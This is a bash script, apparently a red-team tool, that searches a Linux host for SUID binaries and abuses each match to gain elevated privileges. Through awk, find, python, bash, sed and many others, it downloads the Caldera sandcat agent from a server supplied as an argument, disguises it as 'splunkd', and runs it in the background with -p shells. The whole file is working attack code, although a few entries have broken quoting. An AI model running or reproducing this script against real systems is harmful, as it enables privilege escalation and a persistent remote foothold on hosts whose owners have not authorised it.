#!/bin/bash

serv=$1

declare -A suids
suids=(
    ["awk"]="'BEGIN {system(\"server=\\\"$serv\\\";curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd;chmod +x splunkd;./splunkd -server \$server -group red\")}'"
    ["gawk"]="'BEGIN {system(\"server=\\\"$serv\\\";curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd;chmod +x splunkd;./splunkd -server \$server -group red\")}'"
    ["mawk"]="'BEGIN {system(\"server=\\\"$serv\\\";curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd;chmod +x splunkd;./splunkd -server \$server -group red\")}'"
    ["expect"]="-c 'spawn /bin/sh; send \"server=\\\"$serv\\\"\r\"; send \"curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd\r\"; send \"chmod +x splunkd\r\"; send \"./splunkd -server \$server -group red\r\"; interact'"
    ["busybox"]="sh -cp 'server=\"$serv\";curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd;chmod +x splunkd;./splunkd -server \$server -group red'"
    ["find"]=". -type f -exec /bin/sh -pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red' \;"
    ["python"]="-c 'import os; server=\"$serv\"; curl_cmd=f\"curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' {server}/file/download > splunkd\"; chmod_cmd=\"chmod +x splunkd\"; os.system(curl_cmd); os.system(chmod_cmd); os.execl(\"/bin/sh\", \"sh\", \"-p\", \"-c\", f\"./splunkd -server {server} -group red\")'"
    ["ruby"]="-e 'server=\"$serv\"; system(\"curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' #{server}/file/download > splunkd\"); system(\"chmod +x splunkd\"); exec(\"/bin/sh\", \"sh\", \"-p\", \"-c\", \"./splunkd -server #{server} -group red\")'"
    ["nohup"]="/bin/sh -cp 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red' > nohup.out 2>&1 &"
    ["sed"]="'1!G;h;$!d' / 'sh -cp \"server=\\\"$serv\\\";curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd;chmod +x splunkd;./splunkd -server \$server -group red\"'"
    ["zsh"]="-c 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["bash"]="-pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["sh"]="-pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["perf"]="stat sh -pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["nice"]="sh -pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["pexec"]="sh -pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"        
    ["setarch"]="\$(uname -m) /bin/sh -pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"    
    ["watch"]="-x sh -pc 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["timeout"]="1m bash -cp 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["time"]="bash -cp 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["tclsh"]="-c 'exec sh -c \"server=\\\"$serv\\\";curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd;chmod +x splunkd;./splunkd -server \$server -group red\" <@stdin >@stdout 2>@stderr'"
    ["taskset"]="1 sh -cp 'server=\"$serv\"; echo \"Server URL: \$server\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; if [ \$? -ne 0 ]; then echo \"Curl command failed\"; exit 1; fi; chmod +x splunkd; if [ \$? -ne 0 ]; then echo \"Chmod command failed\"; exit 1; fi; ./splunkd -server \$server -group red; if [ \$? -ne 0 ]; then echo \"Execution of splunkd failed\"; exit 1; fi; echo \"Command sequence executed successfully\"'"
    ["strace"]="-o /dev/null bash -pc 'server=\"$serv\"; echo \"Server URL: \$server\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; if [ \$? -ne 0 ]; then echo \"Curl command failed\"; exit 1; fi; echo \"Curl command succeeded\"; chmod +x splunkd; if [ \$? -ne 0 ]; then echo \"Chmod command failed\"; exit 1; fi; echo \"Chmod command succeeded\"; ./splunkd -server \$server -group red; if [ \$? -ne 0 ]; then echo \"Execution of splunkd failed\"; exit 1; fi; echo \"Command sequence executed successfully\"'"
    ["stdbuf"]="-i0 bash -cp 'server=\"$serv\"; echo \"Server URL: \$server\"; echo \"Running curl command...\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; curl_exit_code=\$?; if [ \$curl_exit_code -ne 0 ]; then echo \"Curl command failed with exit code \$curl_exit_code\"; exit 1; fi; echo \"Curl command succeeded\"; echo \"Running chmod command...\"; chmod +x splunkd; chmod_exit_code=\$?; if [ \$chmod_exit_code -ne 0 ]; then echo \"Chmod command failed with exit code \$chmod_exit_code\"; exit 1; fi; echo \"Chmod command succeeded\"; echo \"Running splunkd command...\"; ./splunkd -server \$server -group red; splunkd_exit_code=\$?; if [ \$splunkd_exit_code -ne 0; then echo \"Execution of splunkd failed with exit code \$splunkd_exit_code\"; exit 1; fi; echo \"Command sequence executed successfully\"'"
    ["start-stop-daemon"]="-n $RANDOM -S -x /bin/bash -- -c 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["sshpass"]="bash -cp 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
    ["scanmem"]="-c 'shell bash -cp \"server=\\\"$serv\\\"; curl -s -X POST -H \\\"file:sandcat.go\\\" -H \\\"platform:linux\\\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red\"'"
    ["xdotool"]="exec --sync bash -c 'server=\"$serv\"; curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download > splunkd; chmod +x splunkd; ./splunkd -server \$server -group red'"
)

foundsuids=$(which nice 1>/dev/null 2>&1 && nice -n -15 find / -perm -u=s -type f 2>/dev/null | rev | cut -d' ' -f1 | rev || find / -perm -u=s -type f 2>/dev/null | rev | cut -d' ' -f1 | rev)

for lolbin in $foundsuids; do
    binwithouttrail=$(echo $lolbin | rev | cut -d'/' -f1 | rev)
    if [[ -n ${suids[$binwithouttrail]} ]]; then
        truecommand=$(echo ${suids[$binwithouttrail]} | sed -e "s|^|$lolbin |")
        printf "\n$truecommand\n"
        eval "$truecommand" & 
    fi
done
